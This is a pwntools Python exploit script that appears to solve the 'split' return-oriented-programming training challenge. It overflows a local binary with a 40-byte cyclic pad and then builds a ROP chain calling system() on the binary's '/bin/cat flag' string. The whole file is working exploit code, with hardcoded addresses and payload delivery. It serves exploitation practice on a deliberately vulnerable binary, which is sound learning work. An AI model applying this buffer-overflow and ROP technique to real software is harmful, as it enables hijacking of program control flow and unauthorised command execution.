#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('split')

cat_addr = 0x00601060			# address of the "/bin/cat flag" in the binary | r2 -> izz
system = 0x000000000040074b		# address of system call in another function
context.log_level = 'debug'

rop = ROP(elf)
# rop.system(cat_addr)
rop.call(system, [cat_addr])
payload = cyclic(40) + rop.chain()

io = process(elf.path)
io.sendline(payload)
io.wait_for_close()
io.recv()

